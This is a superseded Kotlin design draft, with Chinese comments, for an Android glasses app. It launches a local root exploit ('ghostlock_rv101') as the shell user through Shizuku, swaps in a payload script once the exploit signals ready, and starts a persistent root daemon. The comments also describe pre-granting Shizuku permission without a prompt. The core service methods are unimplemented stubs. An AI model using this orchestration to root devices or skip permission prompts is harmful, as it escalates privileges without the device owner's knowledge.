// ShizukuGhostlockEngine.draft.kt — 設計草稿（歷史文件）
//
// ⚠【已由正式實作取代，本文件僅供設計歷程參考】⚠
// 正式實作：android/app-glasses/src/main/kotlin/com/rokid/rc/glasses/ghost/ShizukuGhostlockEngine.kt
//          + CommandService.kt + aidl/ICommandService.aidl、ICommandCallback.aidl
// 實機驗證：reports/shizuku_integration_test_report.md（E2E 提權、fallback、手機連動全通過）
//
// 正式版與本草稿的差異（實測驅動）：
//   1. UserServiceArgs 必須 .processNameSuffix("ghost")（v13 強制，否則 bindUserService 拋
//      "process name suffix must not be null"）
//   2. 引擎內建 exploit 提前死亡（OOM SIGKILL/exit 137）fast-fail 偵測 + 內部重試
//      （MAX_INTERNAL_TRY=3，同 helper 行為）+ 每輪 pkill 清理
//   3. ExploitConfig.doneTimeoutMs 由 120s 調為 240s（exploit 核心階段實測 100–142s，
//      helper 用 200s；120s 會在慢輪次提早誤報失敗）
//   4. 成功後亦 killExploit 清殘留 idle root 行程（同 helper）
//
// 目標：讓眼鏡端 App 直接以「shell (uid 2000) 身份」執行 ghostlock_rv101，
//       取代 deploy/root_bridge.sh 的 shell helper 迴圈。
//
// 【定稿事實（2026-09-09，三份研究交叉驗證）】
//  1. 身份：Shizuku server 以 adb shell 啟動時（v13.6.0：adb shell <lib>/libshizuku.so），
//     其 UserService/newProcess/rish 子程序身份 = uid 2000 + u:r:shell:s0，等同 adb shell ✅
//     root 啟動時子程序變 uid 0/kernel context ❌（exploit 要 unprivileged 起跑）。
//  2. api 13.1.5 的 Shizuku.newProcess 已是 private+deprecated → 公開通道是
//     Shizuku.bindUserService(UserServiceArgs, ServiceConnection)（UserService + 自訂 AIDL）。
//  3. UserService 進程身份 = server 身份（server 內 Runtime.exec("sh") 啟動、無 setuid，
//     --uid 只算 userId）→ adb-started server 下 = shell 2000。
//  4. 預授權：pm grant com.rokid.rc.glasses moe.shizuku.manager.permission.API_V23
//     （dangerous 權限，server 啟動時寫回 config）；或直寫
//     /data/user_de/0/com.android.shell/shizuku.json {"version":2,"packages":[{uid,flags:2,...}]}
//     （先寫檔再啟動 server，避免 10s 延遲寫入覆蓋）。
//  5. ⚠ 順序：啟動 exploit → 等 ready 標記（~2s）→ 再置換 .ghostlock_root.sh
//     （先寫 payload 會被 exploit 的預設腳本覆蓋）。
//  6. 需 kernel-panic/重啟偵測（記錄 boot 時間戳，事後比對）。
//
// 依賴：implementation("dev.rikka.shizuku:api:13.1.5")
//       implementation("dev.rikka.shizuku:provider:13.1.5")
// Manifest：ShizukuProvider（authorities="${applicationId}.shizuku"，
//           permission INTERACT_ACROSS_USERS_FULL, exported=true）
//           + <uses-permission android:name="moe.shizuku.manager.permission.API_V23" />
// Application.onCreate(): ShizukuProvider.enableMultiProcessSupport(true)
// 授權：Shizuku.checkSelfPermission() != GRANTED → Shizuku.requestPermission(code)
//       （或上述預授權免 UI）

package com.rokid.rc.glasses.ghost

import android.content.ComponentName
import android.content.Context
import android.content.ServiceConnection
import android.content.pm.PackageManager
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import rikka.shizuku.Shizuku
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * ghostlock LPE 觸發層（Shizuku/UserService 版，設計草稿）。
 *
 * 流程與 ShellGhostlockEngine 相同（launch → ready → install → done），
 * 差別在 exploit 行程經 Shizuku UserService（shell 身份）啟動：
 *
 *   LAUNCH : userService.runCommandStream("GL_SETUP_ATTEMPTS=1 … ghostlock_rv101", cb)
 *   READY  : 輪詢 rootScriptPath 出現 readyMarker
 *   INSTALL: userService.writeFile(payload, rootScriptPath, chmod 755)
 *            （或 setup_direct.sh symlink 後 App 直寫）
 *   DONE   : 輪詢 payloadLog 出現 doneMarker
 */
class ShizukuGhostlockEngine(
    private val context: Context,
    private val config: ExploitConfig = ExploitConfig(),
    private val useDirectPayloadWrite: Boolean = false, // true=已跑 setup_direct.sh（symlink）
) : GhostlockEngine {

    private val payloadLog = GhostlockPaths.payloadLog(context)
    private val exploitLog = GhostlockPaths.exploitLog(context)

    @Volatile
    override var isEnabled: Boolean = false
        private set

    override fun setEnabled(enabled: Boolean) { isEnabled = enabled }

    override fun doneLog(): File = payloadLog

    override var onProgress: ((String) -> Unit)? = null

    @Volatile
    override var rootAcquired: Boolean = false
        private set

    override suspend fun acquireRoot(): ExecResult {
        val client = RootDaemonClient()
        if (client.isRoot()) {
            rootAcquired = true
            onProgress?.invoke("已偵測到常駐 root daemon，跳過 LPE")
            return ExecResult.ok(Stage.DONE, "already rooted")
        }
        val result = exec(LedPayloads.startRootDaemon(doneLog()))
        rootAcquired = result.success
        return result
    }

    override suspend fun exec(payload: RootScript): ExecResult = withContext(Dispatchers.IO) {
        // 0. preflight：Shizuku binder / 權限 / UserService 綁定
        if (!Shizuku.pingBinder()) {
            return@withContext ExecResult.fail(
                Stage.PREFLIGHT,
                "Shizuku server 未執行（每 boot 需 adb 啟動一次：adb shell <lib>/libshizuku.so）"
            )
        }
        if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) {
            Shizuku.requestPermission(REQUEST_CODE) // 或採 pm grant 預授權
            return@withContext ExecResult.fail(Stage.PREFLIGHT, "Shizuku 未授權（允許後重試）")
        }
        val svc = bindCommandService()
            ?: return@withContext ExecResult.fail(Stage.PREFLIGHT, "UserService 綁定失敗")
        try {
            return@withContext execInternal(svc, payload)
        } finally {
            Shizuku.unbindUserService(svc.args, svc.conn, false)
        }
    }

    private suspend fun execInternal(svc: BoundService, payload: RootScript): ExecResult {
        val binary = File(config.binaryPath)
        if (!binary.exists() || !binary.canExecute()) {
            return ExecResult.fail(Stage.PREFLIGHT, "binary 不存在或不可執行：${binary.absolutePath}")
        }

        payloadLog.delete()
        exploitLog.delete()
        val bootStamp = currentBootStamp() // kernel-panic/重啟偵測

        // 1. launch（shell 身份，經 UserService）
        onProgress?.invoke("啟動 exploit（Shizuku/shell 身份）")
        val cmd = "${config.env.joinToString(" ")} ${config.binaryPath}"
        val stream = svc.service.runCommandStream(cmd, EXPLOIT_STREAM_TAG)

        try {
            // 2. ready
            onProgress?.invoke("等待 ready 標記")
            if (!waitFor(config.readyTimeoutMs) { readySeen() }) {
                if (bootChanged(bootStamp)) {
                    return ExecResult.fail(Stage.READY, "kernel panic：裝置已重啟（正常失敗，需重試）")
                }
                return ExecResult.fail(
                    Stage.READY,
                    "ready 標記逾時：${config.rootScriptPath} 未出現 \"${config.readyMarker}\""
                )
            }

            // 3. install payload
            onProgress?.invoke("置換 payload")
            val installed = if (useDirectPayloadWrite) {
                installPayloadDirect(payload)
            } else {
                svc.service.writeFile(config.rootScriptPath, payload.content.toByteArray(), true)
            }
            if (!installed) {
                return ExecResult.fail(Stage.INSTALL, "無法寫入 ${config.rootScriptPath}")
            }

            // 4. done
            onProgress?.invoke("等待 payload 完成")
            if (!waitFor(config.doneTimeoutMs) { doneSeen() }) {
                if (bootChanged(bootStamp)) {
                    return ExecResult.fail(Stage.DONE, "kernel panic：裝置已重啟（正常失敗，需重試）")
                }
                return ExecResult.fail(Stage.DONE, "done 標記逾時。payload log=${readTail(payloadLog, 800)}")
            }
            return ExecResult.ok(Stage.DONE, readTail(payloadLog, 4000))
        } finally {
            stream.close() // 停止回呼/清理
        }
    }

    // ---- Shizuku UserService 綁定（aak 模式）----

    private class BoundService(val args: Shizuku.UserServiceArgs, val conn: ServiceConnection,
                               val service: ICommandService)

    private fun bindCommandService(): BoundService? {
        val args = Shizuku.UserServiceArgs(
            ComponentName("com.rokid.rc.glasses", CommandService::class.java.name)
        ).daemon(true).version(1)
        val holder = arrayOfNulls<IBinder>(1)
        var bound = false
        val conn = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, binder: IBinder?) {
                holder[0] = binder; bound = true
            }
            override fun onServiceDisconnected(name: ComponentName?) { bound = false }
        }
        Shizuku.bindUserService(args, conn)
        if (!waitFor(10_000L) { bound }) return null
        val svc = ICommandService.Stub.asInterface(holder[0]) ?: return null
        return BoundService(args, conn, svc)
    }

    // ---- internals（與 ShellGhostlockEngine 共用邏輯）----

    private fun readySeen(): Boolean = try {
        File(config.rootScriptPath).readText().contains(config.readyMarker)
    } catch (e: Exception) { false }

    private fun installPayloadDirect(payload: RootScript): Boolean = try {
        val target = File(config.rootScriptPath)
        target.writeText(payload.content)
        target.setExecutable(true, false)
        true
    } catch (e: Exception) {
        Log.e(TAG, "installPayloadDirect failed", e); false
    }

    private fun doneSeen(): Boolean =
        payloadLog.exists() && payloadLog.readText().contains(config.doneMarker)

    private fun currentBootStamp(): String = try {
        File("/proc/uptime").readText().trim() // 或 StatFs / sys.boot_completed 對照
    } catch (e: Exception) { "" }

    private fun bootChanged(prev: String): Boolean {
        val cur = currentBootStamp()
        if (prev.isEmpty() || cur.isEmpty()) return false
        // uptime 倒退 = 已重啟
        val p = prev.substringBefore(' ').toDoubleOrNull() ?: return false
        val c = cur.substringBefore(' ').toDoubleOrNull() ?: return false
        return c < p
    }

    private fun waitFor(timeoutMs: Long, cond: () -> Boolean): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (SystemClock.elapsedRealtime() < deadline) {
            if (cond()) return true
            Thread.sleep(config.pollIntervalMs)
        }
        return cond()
    }

    private fun readTail(file: File, max: Int): String = try {
        if (!file.exists()) "(none)" else file.readText().takeLast(max)
    } catch (e: Exception) { "(unreadable)" }

    companion object {
        private const val TAG = "ShizukuGhostlockEngine"
        private const val REQUEST_CODE = 7700
        private const val EXPLOIT_STREAM_TAG = "ghostlock-exploit"
    }
}

// ---- UserService 端（在 shell 身份進程內執行；參考 ghostlock-aak-apk 自行重寫）----

/** 自訂 AIDL（須另建 .aidl 檔）：oneway 流式回呼，雙線程讀 stdout/stderr 防死鎖。 */
interface ICommandService : android.os.IInterface {
    /** 流式執行指令（服務端新 Thread 跑，逐行回呼）。 */
    fun runCommandStream(cmd: String, tag: String): CommandStream
    /** 以 shell 身份寫檔（可 chmod 755）。 */
    fun writeFile(path: String, data: ByteArray, executable: Boolean): Boolean
    abstract class Stub : android.os.Binder(), ICommandService {
        companion object {
            fun asInterface(obj: IBinder?): ICommandService? = obj as? ICommandService
        }
    }
}

/** 流式結果句柄：close() 停止接收。 */
interface CommandStream : AutoCloseable

/** UserService 實作（會以 shell uid 2000 進程載入）。 */
class CommandService : ICommandService.Stub() {
    override fun runCommandStream(cmd: String, tag: String): CommandStream {
        // 服務端：new Thread { Process p = Runtime.exec(["sh","-c",cmd], env);
        //            outThread/errThread 並行 readLine → callback.onLine()（oneway）；
        //            waitFor() → onExit(exit) } — 不設會砍行程的硬 timeout（exploit 100–150s）
        TODO("依 ghostlock-aak-apk 的 runCommandStream 模式實作（自行重寫，遵守 GPL 規範）")
    }

    override fun writeFile(path: String, data: ByteArray, executable: Boolean): Boolean {
        // 服務端：FileOutputStream 寫 + chmod 755（shell 身份）
        TODO("依 ghostlock-aak-apk 的 writeFile 模式實作（自行重寫）")
    }
}
